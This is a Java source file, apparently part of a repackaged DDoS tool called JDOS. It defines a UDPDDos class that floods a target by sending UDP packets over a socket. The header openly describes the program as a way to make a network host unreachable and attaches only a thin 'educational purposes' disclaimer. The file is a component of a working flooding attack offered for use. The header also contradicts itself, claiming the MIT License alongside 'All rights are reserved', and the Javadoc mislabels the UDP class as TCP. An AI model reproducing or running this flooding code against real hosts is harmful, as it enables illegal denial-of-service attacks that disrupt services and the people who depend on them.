/*
 * This program was written by Tobias Schmidradler (schmidi000)
 * and published under the MIT License.
 * 
 * What kind of program is this?
 * This is a program for performing a Distributed Denial of Serivce (DDOS).
 * With a DDOS you could make a host in the network unreachable.
 *
 * 
 * All rights are reserved.
 * 
 * NOTE: 
 * ------------------------------------------------------------------------------------------
 * This program is only for educational purposes!
 * You use this on your own risk. 
 * Distributed Denial of Service attacks are illegal, you could go to jail for this.
 * ------------------------------------------------------------------------------------------
 * 
 * I am liable for nothing!
 *
 * Link: https://github.com/schmidi000/JDOS
 * E-Mail: tobias.schmidradler@gmail.com
 * Website: www.straim.com
 * Copyright (c) 2015
 */
package gq.glowman554.modules.impl.ddos.protocols.implementations;

import gq.glowman554.modules.impl.ddos.DDOSPattern;
import gq.glowman554.modules.impl.ddos.DDOSer;
import gq.glowman554.modules.impl.ddos.protocols.interfaces.UDP;

import java.io.IOException;

/**
 * DDOS implementation for the TCP protocol.
 * 
 * @author Tobias
 * 
 * Last changed: 13.05.2015
 */
public class UDPDDos extends UDP {

    /**
     * Constructor.
     * Create an UDP DDOS with a specified DDOS Pattern.
     * @param ddosPattern 
     */
    public UDPDDos(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }
    
    @Override
    public void writeLineToSocket(String message) {
        byte[] data = message.getBytes();
        getPacket().setData(data);
        getPacket().setLength(data.length);
        try {
            getSocket().send(getPacket());
        } catch (IOException ex) {
            DDOSer.appendToConsole("Error while connecting a Socket!");
            ex.printStackTrace();
        }
    }
}
